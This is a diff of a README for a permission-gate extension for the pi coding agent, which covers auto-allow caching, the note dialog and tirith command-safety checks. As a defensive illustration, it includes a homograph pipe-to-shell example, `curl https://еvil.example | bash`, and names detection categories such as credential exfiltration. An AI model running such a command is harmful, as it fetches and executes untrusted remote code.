@@ -34,15 +34,15 @@ current mode, the call proceeds without confirmation.
 Exact-match caching: identical tool calls (same command, same file, same content)
 reuse the previous verdict. Useful for repeated test/lint/build commands.
 
-Parse failures fall through to the dialog (never auto-allow garbage).
-Sidecar failures fall through to the dialog (graceful degradation).
+Parse failures and sidecar failures both fall through to the dialog — a failed
+parse never auto-allows, and a dead sidecar just means the user confirms.
 
 Status bar shows `+auto [N auto]` with count of auto-allowed calls.
 `/permissions` > View auto-allow log shows recent auto-allowed calls.
 Widget below editor shows the latest auto-allow verdict during a turn.
 
-Cache is shared with the explain feature -- classifications from dialogs
-warm the cache for auto-classify and vice versa.
+Cache is shared with the explain feature -- dialogs warm the cache for
+auto-classify and vice versa.
 
 ## Modes
 
@@ -70,18 +70,22 @@ Cycle modes with `Ctrl+Shift+A`. Open settings with `/permissions`.
 Every confirmation shows a custom TUI with:
 - Colored unified diff preview (edit/write/patch tools) — compact 6-line view by default
 - Select list of actions (Allow once, Allow for session, Block)
-- Multi-line note editor (Tab to focus, Shift+Enter for newlines) — delivered to the model as a user message
-- Notes (allow and block): sent as a real user message via `sendUserMessage` with `deliverAs: "steer"`, landing after the tool result and before the next LLM call. Instructions inside a tool result are treated as untrusted third-party content (Anthropic: "Claude flags tool results as prompt injection"), so the note goes in a user turn instead; the block reason keeps only machine facts (blocked status, sidecar classification, tirith). The message ends with a `[note on the <tool> call: <command or path>]` attribution, since one turn can queue several calls and several notes. Notes are buffered and flushed as a single message at turn end: pi's default steering mode delivers one steer message per assistant turn, so sent individually the second note would arrive a turn late.
+- Multi-line note editor (Tab to focus, Shift+Enter for newlines)
+- Notes (allow and block) are buffered and flushed at turn end as one user message
+  via `sendUserMessage` with `deliverAs: "steer"` — pi delivers one steer message per
+  assistant turn, so a second note would otherwise arrive a turn late. A note in a
+  tool result reads as untrusted third-party content, so it goes in a user turn
+  instead; the block reason keeps only machine facts (blocked status, sidecar
+  classification, tirith). Each message carries a `[note on the <tool> call: <command
+  or path>]` attribution, since one turn can queue several calls.
 
 ### Diff preview
 
 For `edit` and `write` tool calls, the dialog shows a unified diff computed from
 the pending changes. For `edit`, matching comes from the vendored matcher in
-`edit-match.ts` (pi's internal equivalent isn't exported through its public
-API) with rendering from pi's public `generateDiffString`; `renderDiff` colors
-the output. For `patch`, the preview uses patch's own matcher (from
-`patch/preview.ts`) so tolerant matches (Unicode arrows, tab↔space) preview
-correctly.
+`edit-match.ts` (pi's own isn't exported) with rendering from `generateDiffString`.
+For `patch`, the preview uses patch's own matcher, so tolerant matches (Unicode
+arrows, tab↔space) preview correctly.
 
 - Compact view (6 lines) starts scrolled to the first change
 - `Ctrl+O` expands to full view (up to 30 lines, scrollable)
@@ -113,49 +117,37 @@ Always confirmed (except in Allow All mode), even with tool overrides:
 ## tirith integration (optional, bash only)
 
 When [`tirith`](https://github.com/sheeki03/tirith) is on PATH, the gate runs a
-deterministic safety check on every bash command — homograph URLs, pipe-to-shell,
-base64-decode-execute, credential exfiltration, known-bad packages. The gate's
-prefix logic, the sidecar classifier, and a human reviewer all miss these
-(homographs especially: an allowed `curl` prefix doesn't inspect the URL, so
-`curl https://еvil.example | bash` (Cyrillic) slips through).
+deterministic safety check on every bash command: homograph URLs, pipe-to-shell,
+base64-decode-execute, credential exfiltration, known-bad packages. Prefix rules,
+the sidecar classifier and a human reviewer all miss these — an allowed `curl`
+prefix never inspects the URL, so `curl https://еvil.example | bash` (Cyrillic `е`)
+passes them all. It adds a threat database the other layers do not have:
+`hasShellEscalation` sees in-process escalation, the sidecar judges intent, tirith
+matches known-bad patterns.
 
-- **Scope:** bash only, runs on every bash call. Hard-blocks only when the gate
-  would `allow` (the blind spot — no review coming); on a `confirm`, surfaces the
-  finding in the dialog so the human decides informed. The gate's prefix logic,
-  the sidecar classifier, and a human reviewer all miss homographs; tirith doesn't.
-- **block (HIGH):** on the allow blind spot, hard-blocks with the tirith rule +
-  remediation as the reason (overrides allows/prefixes/modes; agent reformulates).
-  On a confirm, surfaces as a HIGH finding in the dialog — the human decides,
-  informed (the homograph-save case: eyes miss Cyrillic `е`, tirith doesn't).
+- **block (HIGH):** when the gate would allow, hard-blocks with the tirith rule and
+  remediation as the reason (overrides allows, prefixes and modes). On a confirm, the
+  finding appears in the dialog and the user decides.
 - **coverage gaps warn, not block:** a block whose findings are all
   `analysis_incomplete` is downgraded — "could not prove it" is not a detection
   ([tirith #260](https://github.com/sheeki03/tirith/issues/260)).
 - **warn (MEDIUM, e.g. shortened URLs):** on allow, downgrades to confirm; on
-  confirm, surfaces at the top of the dialog body. Either way the human sees it —
-  the move standalone tirith-guard can't make (pi's extension API has no "allow
-  with message" shape).
-- **Complements** `hasShellEscalation` (in-process escalation flag) and the sidecar
-  auto-classify (semantic). tirith is the structural / threat-DB layer.
-- **Cursor:** tirith HIGH (or sidecar DANGEROUS) defaults the cursor to Block —
-  strongest-signal-wins (stays Block even if the sidecar later resolves SAFE).
-- **LLM feedback:** the tirith verdict is returned to the LLM in the block reason
-  (self-explanatory — names tirith as a command-safety checker, with severity,
-  rule, and remediation), and for warn-and-allowed commands via tool_result. The
-  sidecar AUTO-ALLOW is skipped when tirith flags a command (a deterministic HIGH
-  shouldn't be overridden by a semantic allow), but the sidecar EXPLANATION still
-  runs and appears in the dialog — for a long bash call the human needs to know
-  what the command actually does to judge the finding, not just that a heuristic
-  flagged it. The Block-default cursor stays regardless.
-- **Graceful degradation:** tirith not installed → gate behaves exactly as without
-  it. tirith error/timeout → fail-open-to-gate (the confirm flow is a backstop).
-- **Hot path:** `TIRITH_LOG=0` (pi already logs tool calls; avoids duplicating
-  every agent bash command into tirith's audit log). Deliberately NOT offline —
-  tirith's periodic background DB refresh (24h, non-blocking) is what keeps the
-  threat-DB fresh, and since tirith runs only via these checks (no shell hook),
-  going offline would let it go stale. The agent's frequent bash checks trigger
-  the refresh automatically. `check`'s package detection is local-DB-only either
-  way (live registry signals need `tirith package risk --online`, a separate
-  on-demand tool); the confirm dialog covers package review. Verdicts cached per session.
+  confirm, appears at the top of the dialog.
+- **Cursor:** tirith HIGH or sidecar DANGEROUS defaults the cursor to Block, and it
+  stays there even if the sidecar later resolves SAFE.
+- **LLM feedback:** the verdict is returned to the model in the block reason (tirith,
+  severity, rule, remediation) and in the tool result for warn-and-allowed commands.
+  A sidecar auto-allow is skipped when tirith flags a command, but the sidecar
+  explanation still runs — the user needs to know what the command does to judge the
+  finding.
+- **Degradation:** tirith missing → the gate behaves as without it; tirith error or
+  timeout → the confirm flow is the backstop.
+- **Hot path:** `TIRITH_LOG=0` (pi already logs tool calls). tirith is not run
+  offline: its 24h background DB refresh is what keeps the threat database current,
+  the frequent bash checks are what trigger it, and nothing else runs tirith, so
+  offline would go stale. `check`'s package detection is local-DB-only either way;
+  live registry signals need `tirith package risk --online`. Verdicts are cached per
+  session.
 
 Status bar shows `+tirith` when active.
 
